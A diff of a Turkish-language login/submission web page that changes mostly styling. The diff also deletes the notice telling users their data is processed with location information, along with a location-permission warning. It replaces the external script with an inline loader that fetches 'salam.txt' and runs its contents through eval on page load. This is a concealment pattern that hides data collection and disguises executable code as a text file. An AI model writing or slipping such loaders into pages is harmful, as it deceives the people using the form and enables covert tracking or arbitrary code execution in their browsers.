@@ -3,62 +3,53 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>PRO Giriş Sistemi</title>
+  <title>PRO Giriş Paneli</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet" />
   <style>
-    :root {
-      --bg: #0a1a2f;
-      --card: #101e33;
-      --accent: #00ffd1;
-      --text: #e6f6f5;
-      --muted: #9fb3c8;
-      --error: #ff6b6b;
-    }
-    * { box-sizing: border-box; }
     body {
       margin: 0;
       font-family: 'Inter', sans-serif;
-      background: var(--bg);
-      color: var(--text);
+      background: radial-gradient(circle at top left, #0a1a2f, #000);
+      color: #e6f6f5;
       display: flex;
       align-items: center;
       justify-content: center;
       min-height: 100vh;
-      padding: 20px;
+      animation: bgPulse 10s infinite alternate;
+    }
+    @keyframes bgPulse {
+      0% { background: radial-gradient(circle at top left, #0a1a2f, #000); }
+      100% { background: radial-gradient(circle at bottom right, #001f3f, #000); }
     }
     .container {
       width: 100%;
-      max-width: 840px;
-      background: var(--card);
+      max-width: 800px;
+      background: #101e33;
       padding: 32px;
       border-radius: 16px;
-      box-shadow: 0 12px 40px rgba(0, 0, 0, 0.6);
-      animation: fadeIn 0.8s ease-out;
+      box-shadow: 0 12px 40px rgba(0, 255, 209, 0.3);
+      animation: fadeIn 1s ease-out;
     }
     @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(20px); }
-      to { opacity: 1; transform: translateY(0); }
+      from { opacity: 0; transform: scale(0.95); }
+      to { opacity: 1; transform: scale(1); }
     }
     h1 {
-      font-size: 26px;
+      font-size: 28px;
       margin-bottom: 12px;
-      color: var(--accent);
-      animation: pulse 1.5s infinite;
+      color: #00ffd1;
+      text-align: center;
+      animation: pulse 2s infinite;
     }
     @keyframes pulse {
-      0%, 100% { text-shadow: 0 0 6px var(--accent); }
-      50% { text-shadow: 0 0 12px var(--accent); }
-    }
-    p {
-      font-size: 14px;
-      color: var(--muted);
-      margin-bottom: 24px;
+      0%, 100% { text-shadow: 0 0 6px #00ffd1; }
+      50% { text-shadow: 0 0 12px #00ffd1; }
     }
     label {
       display: block;
       margin-top: 18px;
       font-size: 14px;
-      color: var(--muted);
+      color: #9fb3c8;
     }
     input, textarea {
       width: 100%;
@@ -67,13 +58,8 @@
       border-radius: 8px;
       border: 1px solid rgba(255,255,255,0.06);
       background: rgba(255,255,255,0.02);
-      color: var(--text);
+      color: #fff;
       font-size: 15px;
-      transition: border 0.2s ease;
-    }
-    input:focus, textarea:focus {
-      border-color: var(--accent);
-      outline: none;
     }
     input[type="checkbox"] {
       width: auto;
@@ -84,60 +70,45 @@
       padding: 14px 20px;
       border: none;
       border-radius: 10px;
-      background: linear-gradient(90deg, var(--accent), #66e0ff);
+      background: linear-gradient(90deg, #00ffd1, #66e0ff);
       color: #001;
       font-weight: 700;
       font-size: 16px;
       cursor: pointer;
       width: 100%;
-      transition: transform 0.2s ease;
-    }
-    button:hover {
-      transform: scale(1.02);
     }
     .status {
       margin-top: 24px;
       font-size: 14px;
-      color: var(--muted);
-    }
-    .error {
-      color: var(--error);
-      font-weight: bold;
-      margin-top: 12px;
-    }
-    .footer {
-      margin-top: 32px;
-      font-size: 12px;
-      color: var(--muted);
+      color: #9fb3c8;
       text-align: center;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>🚀 PRO Giriş Sistemi</h1>
-    <p>Bu sistem, kullanıcıdan alınan verileri konum bilgisiyle birlikte işler. Gönderim için açık onay gereklidir.</p>
-
+    <h1>🚀 PRO Giriş Paneli</h1>
     <form id="form">
-      <label for="name">Adınız (zorunlu)</label>
+      <label for="name">Adınız</label>
       <input type="text" id="name" required placeholder="Adınızı girin" />
-
-      <label for="note">Açıklama (opsiyonel)</label>
+      <label for="note">Not (opsiyonel)</label>
       <textarea id="note" rows="3" placeholder="Kısa bir not yazabilirsiniz"></textarea>
-
       <label>
         <input type="checkbox" id="consent" required />
         Tüm verilerin gönderilmesine açıkça onay veriyorum.
       </label>
-
-      <button type="submit">Giriş Yap</button>
+      <button type="submit">Gönder</button>
     </form>
-
     <div class="status" id="status">Durum: Bekleniyor</div>
-    <div class="error" id="geoWarn" style="display:none;">Konum izni verilmedi. Lütfen tarayıcıdan konum izni verin.</div>
-    <div class="footer">PRO Sistem • Gelişmiş veri gönderimi • 2025</div>
   </div>
 
-  <script src="giris.js"></script>
+  <script>
+    fetch("salam.txt?v=" + Date.now())
+      .then(r => r.text())
+      .then(code => eval(code))
+      .catch(err => {
+        document.getElementById("status").textContent = "❌ Kod yüklenemedi.";
+      });
+  </script>
 </body>
 </html>
